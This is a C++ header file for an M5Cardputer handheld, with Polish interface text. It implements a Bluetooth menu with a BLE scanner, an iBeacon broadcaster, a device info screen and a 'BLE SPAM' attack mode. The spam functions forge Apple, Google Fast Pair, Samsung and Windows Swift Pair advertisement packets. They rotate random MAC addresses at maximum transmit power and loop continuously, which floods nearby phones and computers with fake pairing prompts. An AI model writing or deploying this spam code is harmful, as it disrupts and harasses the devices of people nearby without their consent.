#pragma once
// app_bluetooth.h — Bluetooth dla CardputerOS3
// Nawigacja: FN+;=gora  FN+.=dol  ENTER=ok  ESC(27)=wyjdz

#include "M5Cardputer.h"
#include "core/theme.h"
#include "core/ui.h"
#include <NimBLEDevice.h>
#include <NimBLEBeacon.h>
#include <NimBLEScan.h>
#include <esp_bt.h>
#include <esp_gap_ble_api.h>
#include <esp_mac.h>

static NimBLEAdvertising* _bt_adv = nullptr;
static bool _bt_initialized = false;

static void _bt_deinit() {
    if (_bt_initialized) {
        if (_bt_adv) { _bt_adv->stop(); _bt_adv = nullptr; }
        NimBLEDevice::deinit(true);
        _bt_initialized = false;
        delay(100);
    }
}

static void _bt_init(const char* name = "") {
    _bt_deinit();
    NimBLEDevice::init(name);
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P21);
    _bt_initialized = true;
    _bt_adv = NimBLEDevice::getAdvertising();
}

static void _bt_random_mac() {
    uint8_t mac[6];
    for (int i = 0; i < 6; i++) mac[i] = random(256);
    mac[0] = (mac[0] & 0xFC) | 0x02;
    esp_base_mac_addr_set(mac);
}

static void _spam_send(const uint8_t* payload, size_t len) {
    _bt_random_mac();
    NimBLEAdvertisementData data;
    data.addData(std::string((const char*)payload, len));
    _bt_adv->setAdvertisementData(data);
    _bt_adv->start(); delay(20); _bt_adv->stop(); delay(5);
}

static void _spam_apple() {
    uint8_t p[] = {0x02,0x01,0x06,0x1A,0xFF,0x4C,0x00,0x15,
                   (uint8_t)random(256),0x00,0x00,0x00,0x00,0x00,0x00,
                   0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
    p[9] = random(256);
    _spam_send(p, sizeof(p));
}

static void _spam_android() {
    uint8_t p[] = {0x02,0x01,0x06,0x06,0x16,0x2C,0xFE,0x00,0x01,0xF0};
    _spam_send(p, sizeof(p));
}

static void _spam_samsung() {
    uint8_t p[] = {0x02,0x01,0x02,0x15,0xFF,0x75,0x00,0x42,0x09,
                   0x81,0x02,0x14,0x15,0x03,0x21,0x01,
                   (uint8_t)random(256),0x00,0x00,0x00,0x00,0x00,0x00};
    _spam_send(p, sizeof(p));
}

static void _spam_windows() {
    char n[20];
    snprintf(n, sizeof(n), "Dev_%04X", (int)random(0xFFFF));
    uint8_t p[32];
    int idx = 0;
    p[idx++]=0x02; p[idx++]=0x01; p[idx++]=0x06;
    p[idx++]=0x09; p[idx++]=0xFF; p[idx++]=0x06; p[idx++]=0x00;
    p[idx++]=0x03; p[idx++]=0x00; p[idx++]=0x80; p[idx++]=0x00; p[idx++]=0x00;
    uint8_t nl = strlen(n);
    p[idx++] = nl + 1; p[idx++] = 0x09;
    for (int i = 0; i < nl && idx < 31; i++) p[idx++] = n[i];
    _spam_send(p, idx);
}

static bool _bt_check_esc() {
    M5Cardputer.update();
    if (!M5Cardputer.Keyboard.isChange() || !M5Cardputer.Keyboard.isPressed()) return false;
    auto s = M5Cardputer.Keyboard.keysState();
    if (!s.fn) { for (char c : s.word) { if (c == 27) return true; } return false; }
    for (char c : s.word) { if (c == 'q' || c == 'Q') return true; }
    return false;
}

// ── BLE SCAN ─────────────────────────────────────────
void app_ble_scan() {
    ui_draw_header("BLE SCAN", THEME_BLUE);
    M5Cardputer.Display.setTextColor(THEME_TEXT);
    M5Cardputer.Display.setCursor(6, 30);
    M5Cardputer.Display.print("Szukam urzadzen...");

    _bt_init();
    NimBLEScan* pScan = NimBLEDevice::getScan();
    pScan->setActiveScan(true);
    pScan->setInterval(100);
    pScan->setWindow(99);
    pScan->start(5, false);
    NimBLEScanResults results = pScan->getResults();

    struct Dev { String name; String addr; int rssi; };
    std::vector<Dev> devs;
    for (int i = 0; i < results.getCount(); i++) {
        const NimBLEAdvertisedDevice& dRef = results.getDevice(i);
        NimBLEAdvertisedDevice* d = const_cast<NimBLEAdvertisedDevice*>(&dRef);
        devs.push_back({
            d->getName().length() > 0 ? String(d->getName().c_str()) : String("<brak>"),
            String(d->getAddress().toString().c_str()),
            d->getRSSI()
        });
    }
    pScan->clearResults();
    _bt_deinit();

    if (devs.empty()) { ui_show_info("Nie znaleziono!", THEME_RED); delay(1500); return; }

    int sel = 0, offset = 0;
    const int ROWS = 5;
    bool redraw = true;

    while (true) {
        if (redraw) {
            ui_draw_header("BLE SCAN", THEME_BLUE);
            char hdr[24]; snprintf(hdr, sizeof(hdr), "Znaleziono: %d", (int)devs.size());
            M5Cardputer.Display.setTextColor(THEME_MUTED);
            M5Cardputer.Display.setCursor(150, 6);
            M5Cardputer.Display.print(hdr);
            for (int i = 0; i < ROWS && (i+offset) < (int)devs.size(); i++) {
                int idx = i + offset;
                bool a = (idx == sel);
                if (a) M5Cardputer.Display.fillRect(2, 22+i*19, 236, 18, THEME_BLUE>>2);
                M5Cardputer.Display.setTextColor(a ? THEME_BLUE : THEME_TEXT);
                M5Cardputer.Display.setCursor(6, 26+i*19);
                String n = devs[idx].name;
                if (n.length() > 20) n = n.substring(0, 19) + "~";
                M5Cardputer.Display.print(n);
                M5Cardputer.Display.setTextColor(THEME_MUTED);
                M5Cardputer.Display.setCursor(185, 26+i*19);
                M5Cardputer.Display.print(devs[idx].rssi);
            }
            M5Cardputer.Display.setTextColor(THEME_MUTED);
            M5Cardputer.Display.setCursor(4, 125);
            M5Cardputer.Display.print("FN+;/. nav  ENTER=info  ESC=wyjdz");
            redraw = false;
        }
        M5Cardputer.update();
        if (M5Cardputer.Keyboard.isChange() && M5Cardputer.Keyboard.isPressed()) {
            auto s = M5Cardputer.Keyboard.keysState();
            if (s.fn) {
                if (_word_eq(s.word, ";")) { if(sel>0){sel--;if(sel<offset)offset--;} redraw=true; }
                if (_word_eq(s.word, ".")) { if(sel<(int)devs.size()-1){sel++;if(sel>=offset+ROWS)offset++;} redraw=true; }
                for (char c : s.word) { if (c=='q'||c=='Q') return; }
            } else {
                for (char c : s.word) {
                    if (c=='\n'||c=='\r') {
                        ui_draw_header("INFO", THEME_BLUE);
                        M5Cardputer.Display.setTextColor(THEME_TEXT);
                        M5Cardputer.Display.setCursor(4,28); M5Cardputer.Display.print("Nazwa: "+devs[sel].name);
                        M5Cardputer.Display.setCursor(4,44); M5Cardputer.Display.print("MAC:   "+devs[sel].addr);
                        char rb[24]; snprintf(rb,sizeof(rb),"RSSI:  %d dBm",devs[sel].rssi);
                        M5Cardputer.Display.setCursor(4,60); M5Cardputer.Display.print(rb);
                        M5Cardputer.Display.setTextColor(THEME_MUTED);
                        M5Cardputer.Display.setCursor(4,125); M5Cardputer.Display.print("ENTER=powrot");
                        bool waiting = true;
                        while (waiting) {
                            M5Cardputer.update();
                            if (M5Cardputer.Keyboard.isChange() && M5Cardputer.Keyboard.isPressed()) {
                                auto s2 = M5Cardputer.Keyboard.keysState();
                                for (char c2 : s2.word) { if (c2=='\n'||c2=='\r'||c2==27) { waiting=false; break; } }
                            }
                            if (M5Cardputer.BtnA.wasPressed()) waiting = false;
                            delay(10);
                        }
                        redraw = true;
                    }
                    if (c==27) return;
                }
            }
        }
        if (M5Cardputer.BtnA.wasPressed()) return;
        delay(10);
    }
}

// ── BLE SPAM ─────────────────────────────────────────
void app_ble_spam_menu() {
    while (true) {
        const char* opts[] = {"Apple Spam","Android Spam","Samsung Spam","Windows Spam","Spam ALL"};
        int sel = ui_select_list(opts, 5, "BLE SPAM", THEME_BLUE);
        if (sel < 0) return;

        ui_draw_header("BLE SPAM", THEME_BLUE);
        M5Cardputer.Display.setTextColor(THEME_RED);
        M5Cardputer.Display.setCursor(6, 28);
        M5Cardputer.Display.print(opts[sel]);
        M5Cardputer.Display.setTextColor(THEME_MUTED);
        M5Cardputer.Display.setCursor(4, 125);
        M5Cardputer.Display.print("FN+Q = stop");

        _bt_init();
        int count = 0;
        bool running = true;
        while (running) {
            if (sel==0||sel==4) _spam_apple();
            if (sel==1||sel==4) _spam_android();
            if (sel==2||sel==4) _spam_samsung();
            if (sel==3||sel==4) _spam_windows();
            count++;
            if (count % 10 == 0) {
                M5Cardputer.Display.fillRect(6,44,200,14,THEME_BG);
                M5Cardputer.Display.setTextColor(THEME_CYAN);
                M5Cardputer.Display.setCursor(6,46);
                char buf[24]; snprintf(buf,sizeof(buf),"Wyslano: %d",count);
                M5Cardputer.Display.print(buf);
            }
            if (_bt_check_esc()) running = false;
        }
        _bt_deinit();
    }
}

// ── iBEACON ───────────────────────────────────────────
void app_ibeacon() {
    _bt_init("CardputerADV");
    ui_draw_header("iBEACON", THEME_BLUE);
    M5Cardputer.Display.setTextColor(THEME_GREEN);
    M5Cardputer.Display.setCursor(6, 30);
    M5Cardputer.Display.print("Nadawanie aktywne...");
    M5Cardputer.Display.setTextColor(THEME_MUTED);
    M5Cardputer.Display.setCursor(4, 125);
    M5Cardputer.Display.print("FN+Q = stop");

    NimBLEBeacon beacon;
    beacon.setManufacturerId(0x4c00);
    beacon.setMajor(5); beacon.setMinor(88);
    beacon.setSignalPower(0xC5);
    beacon.setProximityUUID(NimBLEUUID("e4c159a0-8c82-11e6-bdf4-0800200c9a66"));
    NimBLEAdvertisementData advData;
    advData.setFlags(0x1A);
    advData.setManufacturerData(beacon.getData());
    _bt_adv->setAdvertisementData(advData);

    while (!_bt_check_esc()) {
        _bt_adv->start(); delay(20); _bt_adv->stop(); delay(5);
    }
    _bt_deinit();
}

// ── BT INFO ───────────────────────────────────────────
void app_bt_info() {
    ui_draw_header("INFO BLUETOOTH", THEME_BLUE);
    uint8_t mac[6]; esp_read_mac(mac, ESP_MAC_BT);
    char macStr[20];
    snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
             mac[0],mac[1],mac[2],mac[3],mac[4],mac[5]);
    M5Cardputer.Display.setTextColor(THEME_TEXT);
    M5Cardputer.Display.setCursor(4, 28); M5Cardputer.Display.print("MAC adres BT:");
    M5Cardputer.Display.setTextColor(THEME_CYAN);
    M5Cardputer.Display.setCursor(4, 42); M5Cardputer.Display.print(macStr);
    M5Cardputer.Display.setTextColor(THEME_TEXT);
    M5Cardputer.Display.setCursor(4, 60); M5Cardputer.Display.print("Chip: ESP32-S3 / NimBLE");
    M5Cardputer.Display.setCursor(4, 74); M5Cardputer.Display.print("Moc TX: +21 dBm");
    M5Cardputer.Display.setTextColor(THEME_MUTED);
    M5Cardputer.Display.setCursor(4, 125); M5Cardputer.Display.print("ENTER=wyjdz");
    while (true) {
        M5Cardputer.update();
        if (M5Cardputer.Keyboard.isChange() && M5Cardputer.Keyboard.isPressed()) {
            auto s = M5Cardputer.Keyboard.keysState();
            for (char c : s.word) { if (c=='\n'||c=='\r'||c==27) return; }
        }
        if (M5Cardputer.BtnA.wasPressed()) return;
        delay(10);
    }
}

// ── GŁÓWNE MENU ───────────────────────────────────────
void app_bluetooth_menu() {
    while (true) {
        const char* opts[] = {"BLE Scan","BLE Spam","iBeacon","Info BT"};
        int sel = ui_select_list(opts, 4, "BLUETOOTH", THEME_BLUE);
        if (sel < 0) return;
        if (sel == 0) app_ble_scan();
        if (sel == 1) app_ble_spam_menu();
        if (sel == 2) app_ibeacon();
        if (sel == 3) app_bt_info();
    }
}

void app_bluetooth_run() { app_bluetooth_menu(); }
